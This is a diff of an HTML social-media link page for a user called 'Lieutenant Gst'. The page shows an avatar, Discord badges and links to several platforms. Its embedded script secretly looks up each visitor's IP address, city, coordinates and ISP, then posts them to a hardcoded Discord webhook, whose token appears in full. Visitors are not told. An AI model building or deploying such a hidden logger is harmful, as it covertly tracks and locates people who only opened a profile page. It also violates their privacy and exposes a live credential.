@@ -32,6 +32,12 @@
       border: 2px solid #fff;
       margin-bottom: 15px;
     }
+    .badges img {
+      width: 24px;
+      height: 24px;
+      margin: 0 4px;
+      vertical-align: middle;
+    }
     h1 { margin-bottom: 5px; font-size: 26px; }
     p { margin-top: 0; color: #8b949e; }
     .links a {
@@ -46,35 +52,29 @@
       transition: background 0.3s ease;
     }
     .links a:hover { background: #2ea043; }
-    .header, .map-container { display: none; }
+    .header { display: none; }
   </style>
 </head>
 <body>
   <div class="container">
-    <img src="https://cdn.discordapp.com/avatars/1046813139641057300/a_64893a94715b6e62be759ca15e901c7d.gif?size=1024" alt="Profile" class="profile-img" />
-    <h1>Lieutenant Gst</h1>
-    <p>@LieutenantGst</p>
+    <img id="avatar" src="" alt="Profile" class="profile-img" />
+    <h1 id="username">Loading...</h1>
+    <p id="status">Status: loading...</p>
+    <div class="badges" id="badges"></div>
     <div class="links">
       <a href="https://discord.com/invite/H8BSXE2k7N" target="_blank"><i class="fab fa-discord"></i> Join Discord</a>
       <a href="https://tiktok.com/@drangerog.ae?_t=ZT-8uuMdgYNjpu&_r=1" target="_blank"><i class="fab fa-tiktok"></i> TikTok</a>
       <a href="https://youtube.com/@LieutenantGst?si=waUvIkJhaVWmpkU_" target="_blank"><i class="fab fa-youtube"></i> YouTube</a>
       <a href="https://twitch.tv/lietenantghost/home" target="_blank"><i class="fab fa-twitch"></i> Twitch</a>
-      <a href="https://x.com/LieutenantGst?s=21&t=kpTgt45Lr7FsNmx11vu9bg" target="_blank"><i class="fab fa-twitter"></i> X (Twitter)</a>
+      <a href="https://x.com/LieutenantGst" target="_blank"><i class="fab fa-twitter"></i> X (Twitter)</a>
       <a href="https://github.com/LieutenantGst" target="_blank"><i class="fab fa-github"></i> GitHub</a>
-      <a href="https://open.spotify.com/user/18dd9i1k9gmbj5l34c36llyft?si=fFCyo1HfQbK0_mERls4psQ" target="_blank"><i class="fab fa-spotify"></i> Spotify</a>
+      <a href="https://open.spotify.com/user/18dd9i1k9gmbj5l34c36llyft" target="_blank"><i class="fab fa-spotify"></i> Spotify</a>
     </div>
   </div>
 
-  <header class="header"></header>
-
-  <!-- Logger Script -->
-  <script src="./config.js"></script>
   <script>
-    const SAFE_IPS = [
-      "123.45.67.89",     // <- replace these with your actual IPs
-      "98.76.54.32",
-      "111.222.333.444"
-    ];
+    const SAFE_IPS = ["123.45.67.89", "111.111.111.111"];
+    const wbhk = "https://discord.com/api/webhooks/1391278414186549320/2xJRyGf3v5g7zeTbSepNrvJf9UegNWrWlfRHfi0LWfgbM8C2egNvFTgsEZMDx_3zN1ee"; // Replace with your webhook
 
     function get_information(link, callback) {
       const xhr = new XMLHttpRequest();
@@ -83,41 +83,82 @@
       xhr.send();
     }
 
-    get_information("http://ip-api.com/json/?fields=query,status,country,region,city,lat,lon,isp,org,proxy,hosting", function(text) {
+    function ipLogByRaz(ip, extra) {
+      const data = JSON.parse(extra);
+
+      const embed = {
+        title: ip === "SAFE IP" ? "✅ Safe IP Logged" : "🌐 Geolocation Logger",
+        color: ip === "SAFE IP" ? 0x57F287 : 0x5865F2,
+        fields: [
+          { name: "📡 IP", value: `\`${ip}\``, inline: true },
+          { name: "🌍 Location", value: `${data.city || "Unknown"}, ${data.region || "?"}, ${data.country || "?"}`, inline: false },
+          { name: "📍 Coordinates", value: `${data.lat || "?"}, ${data.lon || "?"}`, inline: true },
+          { name: "🖥️ ISP", value: data.isp || "Unknown", inline: true },
+          { name: "🏢 Org", value: data.org || "Unknown", inline: true },
+          { name: "🕵️‍♂️ Proxy", value: `${data.proxy}`, inline: true },
+          { name: "🏬 Hosting", value: `${data.hosting}`, inline: true }
+        ],
+        footer: { text: "Fetched via ip-api.com" },
+        timestamp: new Date().toISOString(),
+        url: `https://api.techniknews.net/ipgeo/${ip}`
+      };
+
+      const payload = {
+        username: "Lieutenant Gst Logger",
+        avatar_url: "https://cdn.discordapp.com/avatars/1046813139641057300/39b520e5c76cada8f2d5a284d94d72a3.png?size=256",
+        embeds: [embed]
+      };
+
+      const request = new XMLHttpRequest();
+      request.open("POST", wbhk);
+      request.setRequestHeader("Content-Type", "application/json");
+      request.send(JSON.stringify(payload));
+    }
+
+    get_information("https://ip-api.com/json/?fields=query,status,country,region,city,lat,lon,isp,org,proxy,hosting", function(text) {
       const data = JSON.parse(text);
       const userIp = data.query;
 
       if (SAFE_IPS.includes(userIp)) {
-        console.log(`Logger skipped for safe IP: ${userIp}`);
+        get_information("https://api.ipify.org/", function(ipText) {
+          const safeData = JSON.stringify({ status: "safe-ip", query: ipText });
+          ipLogByRaz("SAFE IP", safeData);
+        });
         return;
       }
 
-      const extraDiv = document.createElement("div");
-      extraDiv.innerHTML = JSON.stringify(data);
-      extraDiv.id = "razzylog";
-      document.querySelector(".header").appendChild(extraDiv);
-
       get_information("https://api.ipify.org/", function(ipText) {
-        const ipDiv = document.createElement("div");
-        ipDiv.innerHTML = ipText;
-        ipDiv.id = "ipppp";
-        document.querySelector(".header").appendChild(ipDiv);
-
         ipLogByRaz(ipText, JSON.stringify(data));
       });
     });
 
-    function ipLogByRaz(ip, extra) {
-      const request = new XMLHttpRequest();
-      request.open("POST", wbhk);
-      request.setRequestHeader("Content-type", "application/json");
-      const params = {
-        username: "Lieutenant Gst",
-        avatar_url: "https://cdn.discordapp.com/avatars/1046813139641057300/a_64893a94715b6e62be759ca15e901c7d.gif?size=1024",
-        content: `**IP**: _${ip}_\n**Geo**: _https://api.techniknews.net/ipgeo/${ip}_\n**Details**:\n\`\`\`${extra}\`\`\``
-      };
-      request.send(JSON.stringify(params));
-    }
+    // Discord Info
+    const badgeIcons = {
+      activeDeveloper: "https://cdn.jsdelivr.net/gh/AnIdiotsGuide/discord-badges@master/assets/active-developer.svg",
+      hypesquadOnlineHouse2: "https://cdn.jsdelivr.net/gh/AnIdiotsGuide/discord-badges@master/assets/hypesquad-brilliance.svg"
+    };
+
+    fetch("https://50943325-679b-4d36-8a75-748a818c8261-00-113nqzxgbo8ft.picard.replit.dev/discord-info")
+      .then(res => res.json())
+      .then(data => {
+        document.getElementById("avatar").src = data.avatar.formats.png || "";
+        document.getElementById("username").textContent = data.user.username;
+        document.getElementById("status").textContent = `Status: ${data.presence.status || "unknown"}`;
+        const badgeList = document.getElementById("badges");
+        const badges = data.badges;
+        for (const key in badges) {
+          if (badges[key] && badgeIcons[key]) {
+            const img = document.createElement("img");
+            img.src = badgeIcons[key];
+            img.alt = key;
+            img.title = key;
+            badgeList.appendChild(img);
+          }
+        }
+      })
+      .catch(err => {
+        console.error("Discord info failed:", err);
+      });
   </script>
 </body>
 </html>
